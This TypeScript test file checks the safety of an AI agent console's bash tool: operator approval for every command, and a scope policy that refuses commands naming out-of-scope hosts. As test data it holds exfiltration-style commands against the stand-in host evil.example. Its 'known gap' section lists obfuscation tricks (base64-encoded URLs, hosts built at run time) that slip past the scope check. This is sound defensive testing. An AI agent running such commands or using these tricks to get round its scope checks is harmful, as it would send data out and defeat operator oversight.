/**
 * Safety of the shell-first core toolset. With `bash` as the main action tool the
 * access boundary must not depend on parsing shell text, so these tests drive the
 * real console dispatch and assert on side effects, not on the classifier.
 *
 * There is one mode (shell access). What limits it: "ask before running commands"
 * puts every command to the operator, and a target scope refuses commands that
 * name an out-of-scope host before they run. See docs/design/core-toolset.md for the known gaps.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
vi.mock("../plugins/enablement.js", async (importOriginal) => ({
  ...await importOriginal<object>(),
  readEnablement: () => ({ schema: 1, project: process.cwd(), enabled: { scope: { version: "1.0.0", capabilities: [], enabledAt: 1 } } }),
}));
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createConsoleSession } from "./turn-engine.js";
import type { NativeMessage, NativeRuntime, NativeRuntimeResult, NativeToolDef } from "../runtime/types.js";
import { ScopePolicy, extractUrls } from "../scope/scope.js";

class ScriptedRuntime implements NativeRuntime {
  readonly type = "api" as const;
  constructor(private readonly script: NativeRuntimeResult[]) {}
  async isAvailable(): Promise<boolean> { return true; }
  async executeNative(_s: string, _m: NativeMessage[], _t: NativeToolDef[]): Promise<NativeRuntimeResult> {
    const next = this.script.shift();
    if (!next) throw new Error("script exhausted");
    return next;
  }
}
const end = (text: string): NativeRuntimeResult => ({ content: [{ type: "text", text }], stopReason: "end_turn", durationMs: 1 });
const use = (name: string, input: Record<string, unknown>): NativeRuntimeResult => ({ content: [{ type: "tool_use", id: "c1", name, input }], stopReason: "tool_use", durationMs: 1 });

let dir: string;
let mark: string;
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), "core-safety-")); mark = join(dir, "MARK"); writeFileSync(join(dir, "victim.txt"), "keep\n"); });
afterEach(() => { rmSync(dir, { recursive: true, force: true }); vi.restoreAllMocks(); });

describe("There is one mode: the shell runs, and an older access value changes nothing", () => {
  for (const legacy of ["read-only", "observe", "recon", "standard", "act", "yolo", "copilot", "run", "propose", "changes"] as const) {
    it(`bash runs with the stored value ${legacy}${legacy === "standard" || legacy === "propose" ? " (still asks first, as before)" : ""}`, async () => {
      const asks = legacy === "standard" || legacy === "propose";
      const approveTool = vi.fn(async () => true);
      const session = createConsoleSession({
        runtime: new ScriptedRuntime([use("bash", { command: `touch ${mark}` }), end("done")]),
        autonomyMode: legacy, ...(asks ? { approveTool } : {}), allowModelSelfExtension: false, refineObjective: false,
      });
      try {
        const result = (await session.send("create the marker")).toolCalls[0]!.result;
        expect(result.error ?? "").not.toMatch(/read-only/i);
        expect(existsSync(mark)).toBe(true);
        expect(approveTool).toHaveBeenCalledTimes(asks ? 1 : 0);
      } finally { await session.cleanup(); }
    });
  }
  it("the session no longer exposes an access state", async () => {
    const session = createConsoleSession({ runtime: new ScriptedRuntime([]), autonomyMode: "read-only", allowModelSelfExtension: false, refineObjective: false });
    try { expect(session).not.toHaveProperty("autonomyMode"); } finally { await session.cleanup(); }
  });
});

describe("Ask before running commands puts every shell command to the operator", () => {
  it("does not run a command the operator declines, and runs it only after approval", async () => {
    const approveTool = vi.fn(async () => false);
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([use("bash", { command: `touch ${mark}` }), end("declined")]),
      approvals: "ask", approveTool, allowModelSelfExtension: false, refineObjective: false,
    });
    try {
      const result = (await session.send("create the marker")).toolCalls[0]!.result;
      expect(approveTool).toHaveBeenCalledTimes(1);
      expect(result.success).toBe(false);
      expect(existsSync(mark)).toBe(false);
    } finally { await session.cleanup(); }

    const approve = vi.fn(async () => true);
    const approved = createConsoleSession({
      runtime: new ScriptedRuntime([use("bash", { command: `touch ${mark}` }), end("done")]),
      approvals: "ask", approveTool: approve, allowModelSelfExtension: false, refineObjective: false,
    });
    try {
      await approved.send("create the marker");
      expect(approve).toHaveBeenCalledTimes(1);
      expect(existsSync(mark)).toBe(true);
    } finally { await approved.cleanup(); }
  });
});

describe("Target scope holds for commands that name a host", () => {
  const foreign = [
    `curl -X POST https://evil.example/collect -d x`,
    `curl --data x https://evil.example/collect`,
    `python3 -c "import urllib.request as u; u.urlopen('https://evil.example/x')"`,
    `bash -c "curl https://evil.example/x"`,
    `wget https://evil.example/x -O ${"/tmp/never-written-core-safety"}`,
    `curl "https://evil.example/$(whoami)"`,
  ];
  for (const legacy of [undefined, "read-only", "yolo"] as const) it(`refuses out-of-scope hosts before running, without growing the scope${legacy ? ` (stored value ${legacy})` : ""}`, async () => {
    const requestScope = vi.fn(async () => null);
    const session = createConsoleSession({
      runtime: new ScriptedRuntime(foreign.flatMap(command => [use("bash", { command }), end("refused")])),
      target: "https://target.test",
      scope: ScopePolicy.fromJson({ in_scope: ["target.test"] }),
      requestScope, allowModelSelfExtension: false, refineObjective: false, ...(legacy ? { autonomyMode: legacy } : {}),
    });
    try {
      for (const command of foreign) {
        const result = (await session.send(command)).toolCalls[0]!.result;
        expect(result.success, command).toBe(false);
      }
      expect(session.scope?.match("https://evil.example").allowed ?? false).toBe(false);
      expect(existsSync("/tmp/never-written-core-safety")).toBe(false);
    } finally { await session.cleanup(); }
  });
});

describe("Known gap: host names the command text does not spell out", () => {
  // The shell scope check reads URLs from the command text. A host assembled at run
  // time is invisible to it. These assertions document the gap so closing it (an
  // egress proxy or network-isolated executor) has to update them. Until then the
  // protection for such commands is the executor sandbox, not the classifier.
  it.each([
    `curl "$(printf 'https://evil.%s/x' example)"`,
    `h=evil.example; curl https://$h/x`,
    `curl $(echo aHR0cHM6Ly9ldmlsLmV4YW1wbGUveA== | base64 -d)`,
    `python3 -c "import socket; socket.create_connection(('evil.' + 'example', 443))"`,
  ])("is not caught by URL extraction: %s", (command) => {
    expect(extractUrls(command).filter(url => url.includes("evil.example"))).toEqual([]);
  });
});
